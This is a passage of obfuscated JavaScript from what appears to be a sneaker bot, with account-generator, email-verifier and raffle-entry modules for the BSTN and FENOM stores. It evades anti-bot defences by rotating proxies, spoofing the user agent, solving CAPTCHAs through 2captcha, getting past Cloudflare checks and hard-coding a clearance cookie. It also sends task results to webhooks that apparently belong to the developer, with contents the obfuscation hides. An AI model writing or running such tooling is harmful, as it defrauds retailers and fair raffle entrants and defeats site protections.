                        var _0x14121f = Math['round'](Math['random']() * (_0x28f6da['length'] - 0x1)), _0xde78f1 = _0x28f6da[_0x14121f]['split'](':');
                        const _0x24047d = await _0x198f78['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xde78f1[0x0] + ':' + _0xde78f1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x56b7cf = await _0x24047d['newPage']();
                            await _0x56b7cf['authenticate']({
                                'username': '' + _0xde78f1[0x2],
                                'password': '' + _0xde78f1[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56b7cf['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x56b7cf['setRequestInterception'](!![]), _0x56b7cf['on']('request', _0x49916c => {
                                _0x49916c['resourceType']() === 'image' ? _0x49916c['abort']() : _0x49916c['continue']();
                            }), await _0x56b7cf['goto']('' + _0x58744e), await _0x56b7cf['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x56b7cf['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1a79bd(0x7d0), console['log'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1a79bd(0x190), await _0x56b7cf['waitForSelector']('#firstname'), await _0x56b7cf['type']('#firstname', _0xdca68b[_0x3046b5]['FirstName'], { 'delay': 0xf0 }), await _0x1a79bd(0x190), await _0x56b7cf['type']('#lastname', _0xdca68b[_0x3046b5]['LastName'], { 'delay': 0xe6 }), await _0x1a79bd(0x190), await _0x56b7cf['type']('#email_address', _0xdca68b[_0x3046b5]['Email'], { 'delay': 0x122 }), await _0x1a79bd(0x190), await _0x56b7cf['type']('#password', _0xdca68b[_0x3046b5]['Password'], { 'delay': 0x82 }), await _0x1a79bd(0x1f4), await _0x56b7cf['type']('#password-confirmation', _0xdca68b[_0x3046b5]['Password'], { 'delay': 0x7c }), console['log'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1a79bd(0x2bc), await _0x56b7cf['$eval']('#form-validate', _0x38f5de => _0x38f5de['submit']()), await _0x1a79bd(0x1388);
                            const _0x528987 = await _0x56b7cf['$']('#email_address-error');
                            if (_0x528987)
                                throw new Error('Invalid\x20Email');
                            const _0x1ef8e9 = await _0x56b7cf['$']('#password-error');
                            if (_0x1ef8e9)
                                throw new Error('Invalid\x20Password');
                            await _0x56b7cf['waitForSelector']('div.mesg-success'), _0x1883fa = 'no', console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20Account\x20' + _0xdca68b[_0x3046b5]['Email'] + '\x20Generated')), _0x496729['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0xdca68b[_0x3046b5]['Email'] + ',' + _0xdca68b[_0x3046b5]['Password']);
                            try {
                                _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x336a6e['succesDEVMSG']);
                            } catch {
                            }
                            await _0x21228b(_0x1cab4c, _0x336a6e['succesDEVMSG']), console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x357307) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20' + _0x357307)), _0x57ff35 = '' + _0x357307;
                            var _0x5b41d5 = await _0x550a27(_0xdca68b[_0x3046b5], _0x1ad403, 'acc', !![], _0x57ff35);
                            _0x336a6e['errorDEV'] = { 'embeds': [_0x5b41d5] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x336a6e['errorDEV']), await _0x21228b(_0x549818, _0x336a6e['errorDEV']), _0x1883fa = 'yes';
                        } finally {
                            _0x24047d['close']();
                            if (_0x1883fa == 'yes' && _0x1a4d79 != 0x5) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Task\x20' + (_0x3046b5 + 0x1) + '\x20:\x20Retrying')), _0x3046b5 = _0x3046b5 - 0x1, _0x1a4d79 = _0x1a4d79 + 0x1;
                                continue;
                            }
                            _0x1883fa == 'yes' && _0x1a4d79 >= 0x5 && (_0x2e4d36(_0xdca68b[_0x3046b5], _0x1ad403), _0x1883fa = 'no', _0x1a4d79 = 0x0), console['log'](_0x223c9e() + '\x20[' + _0x1ad403['name'] + ']\x20Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x203d54, _0x5b5de7) {
                    var _0x3c2b72 = [];
                    async function _0x12bf61() {
                        var _0x11df8e = new _0x27a360({
                            'user': _0x37a01c['masterMail'],
                            'password': _0x37a01c['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5c94eb(_0x9cba09) {
                            _0x11df8e['openBox']('INBOX', ![], _0x9cba09);
                        }
                        _0x11df8e['once']('ready', function () {
                            _0x5c94eb(function (_0x323545, _0x56cab4) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x323545)
                                    throw _0x323545;
                                _0x11df8e['seq']['search'](['UNSEEN'], function (_0x33e6bb, _0x583109) {
                                    if (!_0x583109 || !_0x583109['length'])
                                        console['log'](_0x223c9e() + '\x20[' + _0x203d54['name'] + ']\x20No\x20mails\x20found'), _0x11df8e['end']();
                                    else {
                                        var _0x324c4e = _0x11df8e['seq']['fetch'](_0x583109, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x324c4e['on']('message', function (_0x127e48, _0x227b02) {
                                            var _0x54ab89 = '(#' + _0x227b02 + ')\x20';
                                            _0x127e48['on']('body', function (_0x2d35c8, _0x2d9fb8) {
                                                _0x5d77b8(_0x2d35c8, (_0x1b8254, _0x2704f9) => {
                                                    if (_0x2704f9['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x962e0f = _0x2704f9['text']['split']('[')[0x2], _0x1bd9a0 = _0x962e0f['split'](']')[0x0], _0x5c86ce = _0x2704f9['html']['split']('\x0a');
                                                        _0x3c2b72['push'](_0x1bd9a0);
                                                    }
                                                });
                                            }), _0x127e48['once']('end', function () {
                                            });
                                        }), _0x324c4e['once']('error', function (_0x2badd8) {
                                            console['log']('Fetch\x20error:\x20' + _0x2badd8);
                                        }), _0x324c4e['once']('end', function () {
                                            _0x11df8e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x11df8e['once']('error', function (_0x1eee68) {
                            console['log'](_0x41d282['red'](_0x1eee68['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x11df8e['once']('end', async function () {
                        }), _0x11df8e['connect']();
                    }
                    async function _0x186614(_0x193c83, _0x271ca7, _0x5b99af) {
                        _0x198f78['use'](_0x538ad0());
                        for (var _0x19487d = 0x0; _0x19487d < _0x271ca7['length']; _0x19487d++) {
                            if (_0x1d9d44 != 'yes')
                                var _0x1d9d44 = '', _0x164f85 = 0x0;
                            var _0x233971 = Math['round'](Math['random']() * (_0x5b99af['length'] - 0x1)), _0x4c1fd4 = _0x5b99af[_0x233971]['split'](':');
                            const _0x4aecdb = await _0x198f78['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c1fd4[0x0] + ':' + _0x4c1fd4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x16ea8c = await _0x4aecdb['newPage']();
                                await _0x16ea8c['authenticate']({
                                    'username': '' + _0x4c1fd4[0x2],
                                    'password': '' + _0x4c1fd4[0x3]
                                }), console['log'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Task\x20' + (_0x19487d + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x16ea8c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x16ea8c['setRequestInterception'](!![]), _0x16ea8c['on']('request', _0x5ad30a => {
                                    _0x5ad30a['resourceType']() === 'image' || _0x5ad30a['resourceType']() === 'font' || _0x5ad30a['resourceType']() === 'media' ? _0x5ad30a['abort']() : _0x5ad30a['continue']();
                                }), console['log'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Task\x20' + (_0x19487d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x16ea8c['goto'](_0x271ca7[_0x19487d]), console['log'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Task\x20' + (_0x19487d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x16ea8c['waitForTimeout'](0xbb8);
                                try {
                                    await _0x16ea8c['waitForSelector']('.account-nav'), _0x1d9d44 = 'no', console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Task\x20' + (_0x19487d + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x31bf10 = await _0x550a27(null, _0x193c83, 'ver', ![]);
                                    const _0x4dc355 = { 'succesDEVMSG': { 'embeds': [_0x31bf10] } };
                                    await _0x21228b(_0x2a57e7, _0x4dc355['succesDEVMSG']);
                                } catch (_0x43a683) {
                                    throw new Error(_0x43a683);
                                }
                            } catch (_0x757e61) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Task\x20' + (_0x19487d + 0x1) + '\x20:\x20' + _0x757e61));
                                var _0x2c88b1 = _0x757e61, _0x1d94a3 = await _0x550a27(null, _0x193c83, 'ver', !![], _0x2c88b1);
                                const _0x4c00bb = { 'errorDEVMSG': { 'embeds': [_0x1d94a3] } };
                                _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x4c00bb['errorDEVMSG']), await _0x21228b(_0x549818, _0x4c00bb['errorDEVMSG']), _0x1d9d44 = 'yes';
                            } finally {
                                _0x4aecdb['close']();
                                if (_0x1d9d44 == 'yes' && _0x164f85 != 0x5) {
                                    console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Task\x20' + (_0x19487d + 0x1) + '\x20:\x20Retrying')), _0x19487d = _0x19487d - 0x1, _0x164f85 = _0x164f85 + 0x1;
                                    continue;
                                }
                                _0x1d9d44 == 'yes' && _0x164f85 >= 0x5 && (_0x1d9d44 = 'no', _0x164f85 = 0x0), console['log'](_0x223c9e() + '\x20[' + _0x193c83['name'] + ']\x20Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                            }
                        }
                    }
                    try {
                        _0x12bf61(), await _0x1a79bd(0xfa0), console['log']('Found\x20' + _0x3c2b72['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x186614(_0x203d54, _0x3c2b72, _0x5b5de7);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4dfd4d, _0x533cde, _0x5022b5) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x25a672 = 0x0; _0x25a672 < _0x533cde['length']; _0x25a672++) {
                        var _0x391d0d;
                        await _0x170817(_0x533cde, _0x25a672);
                        if (_0xc7bc5d != 'yes')
                            var _0xc7bc5d = '', _0x14cd6b = 0x0;
                        _0x219354(_0x4dfd4d['name'] + '\x20Task\x20' + (_0x25a672 + 0x1) + '\x20/\x20' + _0x533cde['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
                        var _0x3a5486 = Math['round'](Math['random']() * (_0x5022b5['length'] - 0x1)), _0x38cd5f = _0x5022b5[_0x3a5486]['split'](':'), _0x810089;
                        try {
                            _0x810089 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x38cd5f[0x0] + ':' + _0x38cd5f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x810089 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x38cd5f[0x0] + ':' + _0x38cd5f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5b160b = await _0x810089['newPage'](), _0x26b9d7 = await _0x5b160b['target']()['createCDPSession'](), { windowId: _0x12834f } = await _0x26b9d7['send']('Browser.getWindowForTarget');
                            await _0x5b160b['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x31125a = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x5b160b['authenticate']({
                                'username': '' + _0x38cd5f[0x2],
                                'password': '' + _0x38cd5f[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b160b['goto']('' + _0x533cde[_0x25a672]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x5b160b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x26b9d7['send']('Browser.setWindowBounds', {
                                'windowId': _0x12834f,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x1a79bd(0x1388), await _0x5b160b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5b160b['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1a79bd(0x1f4), console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5b160b['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x546bc3 => _0x546bc3['click']()), await _0x5b160b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5b160b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1a79bd(0x7d0), await _0x5b160b['waitForSelector']('#email-login'), await _0x5b160b['type']('#email-login', '' + _0x533cde[_0x25a672]['Email']), await _0x1a79bd(0xdac), await _0x5b160b['waitForSelector']('#password'), await _0x5b160b['type']('#password', '' + _0x533cde[_0x25a672]['Password'], { 'delay': 0xe6 }), await _0x1a79bd(0x157c);
                            try {
                                await _0x5b160b['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x1bf3b6 => _0x1bf3b6['click']());
                            } catch {
                            }
                            try {
                                await _0x5b160b['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x59e401) {
                            }
                            await _0x1a79bd(0x3e8);
                            const _0x1ff297 = await _0x5b160b['$']('.enteredDraw_container__2KmQ_');
                            if (_0x1ff297)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x533cde[_0x25a672]['Size']);
                            if (_0x533cde[_0x25a672]['Size'] != 'RANDOM') {
                                var _0x174512 = _0x533cde[_0x25a672]['Size']['replace']('.', ',');
                                const _0x1c7fab = await _0x5b160b['$x']('//div[contains(text(),\x20' + _0x174512 + ')]');
                                await _0x1c7fab[0x0]['click']();
                            } else {
                                const _0x395937 = await _0x5b160b['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x4e4760 = Math['round'](Math['random']() * (_0x395937['length'] - 0x1));
                                await _0x395937[_0x4e4760]['click']();
                            }
                            await _0x1a79bd(0x1f4);
                            const _0x2b02ac = await _0x5b160b['$']('.addressList_addressItem__LE2PB');
                            if (_0x2b02ac && _0x533cde[_0x25a672]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x5b160b['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x1a79bd(0x5dc), await _0x5b160b['waitForSelector']('#firstname'), await _0x5b160b['type']('#firstname', '' + _0x533cde[_0x25a672]['FirstName']), await _0x1a79bd(0x1f4), await _0x5b160b['waitForSelector']('#firstname'), await _0x5b160b['type']('#lastname', '' + _0x533cde[_0x25a672]['LastName']), await _0x1a79bd(0x1f4), await _0x5b160b['waitForSelector']('#firstname'), await _0x5b160b['type']('#street', '' + _0x533cde[_0x25a672]['Address1']), await _0x1a79bd(0x1f4), await _0x5b160b['waitForSelector']('#firstname'), await _0x5b160b['type']('#houseNumber', _0x533cde[_0x25a672]['HouseNumber'] + '\x20' + _0x533cde[_0x25a672]['Address2']), await _0x1a79bd(0x1f4), await _0x5b160b['waitForSelector']('#firstname'), await _0x5b160b['select']('#country_code', '' + _0x533cde[_0x25a672]['Country']), await _0x1a79bd(0x1f4), await _0x5b160b['type']('#postcode', '' + _0x533cde[_0x25a672]['Zip']), await _0x1a79bd(0x1f4), await _0x5b160b['type']('#city', '' + _0x533cde[_0x25a672]['City']), await _0x1a79bd(0x1f4), await _0x5b160b['type']('#telephone', '' + _0x533cde[_0x25a672]['Phone']), await _0x1a79bd(0x1f4), await _0x5b160b['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x1a79bd(0x9c4);
                            try {
                                await _0x5b160b['type']('#instagram_name', '' + _0x533cde[_0x25a672]['Follower']), await _0x5b160b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1a79bd(0x5dc);
                            try {
                                await _0x5b160b['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x1a79bd(0x5dc), await _0x5b160b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x30acb1 => _0x30acb1['click']()), await _0x1a79bd(0x1388);
                            try {
                                await _0x5b160b['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x5b160b['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x533cde[_0x25a672]['Size'] != 'RANDOM') {
                                    var _0x174512 = _0x533cde[_0x25a672]['Size']['replace']('.', ',');
                                    const _0x572bbe = await _0x5b160b['$x']('//div[contains(text(),\x20' + _0x174512 + ')]');
                                    await _0x572bbe[0x0]['click']();
                                } else {
                                    const _0x4b7ca4 = await _0x5b160b['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4e4760 = Math['round'](Math['random']() * (_0x4b7ca4['length'] - 0x1));
                                    await _0x4b7ca4[_0x4e4760]['click']();
                                }
                                await _0x1a79bd(0x5dc);
                                try {
                                    await _0x5b160b['hover']('#instagram_name'), await _0x5b160b['type']('#instagram_name', '' + _0x533cde[_0x25a672]['Follower']), await _0x5b160b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Retrying'), await _0x5b160b['hover']('.checkBox_boxHolder__wLGVe'), await _0x1a79bd(0x5dc), await _0x5b160b['click']('.checkBox_boxHolder__wLGVe'), await _0x1a79bd(0x157c), await _0x5b160b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x89c3ba => _0x89c3ba['click']()), await _0x1a79bd(0x1388), await _0x5b160b['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0xc7bc5d = 'no', _0x4c6d06(_0x533cde[_0x25a672], _0x4dfd4d), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x186626 = await _0x550a27(_0x533cde[_0x25a672], _0x4dfd4d, 'dev', ![]), _0x39adf7 = await _0x550a27(_0x533cde[_0x25a672], _0x4dfd4d, 'pub', ![]);
                            const _0x40a64c = {
                                'succesDEVMSG': { 'embeds': [_0x186626] },
                                'succesPUBMSG': { 'embeds': [_0x39adf7] }
                            };
                            try {
                                _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x40a64c['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x40a64c['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x136ee7, _0x40a64c['succesPUBMSG']);
                            } catch (_0xf816b0) {
                                console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf816b0));
                            }
                        } catch (_0x3ea082) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20' + _0x3ea082)), _0xc7bc5d = 'yes', _0x391d0d = '' + _0x3ea082;
                            var _0x438b21 = await _0x550a27(_0x533cde[_0x25a672], _0x4dfd4d, 'dev', !![], _0x391d0d), _0x186626 = await _0x550a27(_0x533cde[_0x25a672], _0x4dfd4d, 'dev', ![]), _0x39adf7 = await _0x550a27(_0x533cde[_0x25a672], _0x4dfd4d, 'pub', ![]);
                            const _0x327b00 = {
                                'succesDEVMSG': { 'embeds': [_0x186626] },
                                'succesPUBMSG': { 'embeds': [_0x39adf7] }
                            };
                            _0x327b00['errorDEV'] = { 'embeds': [_0x438b21] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x327b00['errorDEV']), await _0x21228b(_0x549818, _0x327b00['errorDEV']);
                        } finally {
                            _0x810089['close']();
                            if (_0xc7bc5d == 'yes' && _0x14cd6b != 0x5) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Task\x20' + (_0x25a672 + 0x1) + '\x20:\x20Retrying')), _0x25a672 = _0x25a672 - 0x1, _0x14cd6b = _0x14cd6b + 0x1;
                                continue;
                            }
                            _0xc7bc5d == 'yes' && _0x14cd6b >= 0x5 && (_0x2e4d36(_0x533cde[_0x25a672], _0x4dfd4d), _0xc7bc5d = 'no', _0x14cd6b = 0x0), console['log'](_0x223c9e() + '\x20[' + _0x4dfd4d['name'] + ']\x20Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x4e99eb, _0x341dc1, _0x49b3ad) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5ced76 = 0x0; _0x5ced76 < _0x341dc1['length']; _0x5ced76++) {
                        if (_0x52312e != 'yes')
                            var _0x52312e = '', _0x5b2c59 = 0x0;
                        var _0x273cf2;
                        await _0x170817(_0x341dc1, _0x5ced76), _0x219354(_0x4e99eb['name'] + '\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20/\x20' + _0x341dc1['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
                        var _0x36f13d = await _0x550a27(_0x341dc1[_0x5ced76], _0x4e99eb, 'acc', ![]);
                        const _0x15026f = { 'succesDEVMSG': { 'embeds': [_0x36f13d] } }, _0xaa1b6e = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4e27b0 = Math['round'](Math['random']() * (_0x49b3ad['length'] - 0x1)), _0x5bba33 = _0x49b3ad[_0x4e27b0]['split'](':'), _0x514823;
                        try {
                            _0x514823 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5bba33[0x0] + ':' + _0x5bba33[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x514823 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5bba33[0x0] + ':' + _0x5bba33[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x58691f = await _0x514823['newPage']();
                            await _0x58691f['setViewport']({
                                'width': 0x500 + _0x484ff7(0x1, 0x32),
                                'height': 0x2d9 + _0x484ff7(0x1, 0x32)
                            });
                            const _0x57b720 = await _0x58691f['target']()['createCDPSession'](), { windowId: _0x30b2b4 } = await _0x57b720['send']('Browser.getWindowForTarget');
                            await _0x58691f['authenticate']({
                                'username': '' + _0x5bba33[0x2],
                                'password': '' + _0x5bba33[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x58691f['goto']('' + _0xaa1b6e, { 'waitUntil': 'networkidle2' }), await _0x1a79bd(0x1388), console['log'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x551f1e = await _0x58691f['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x551f1e && await _0x551f1e['click']();
                            } catch {
                            }
                            await _0x57b720['send']('Browser.setWindowBounds', {
                                'windowId': _0x30b2b4,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x58691f['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x1a79bd(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
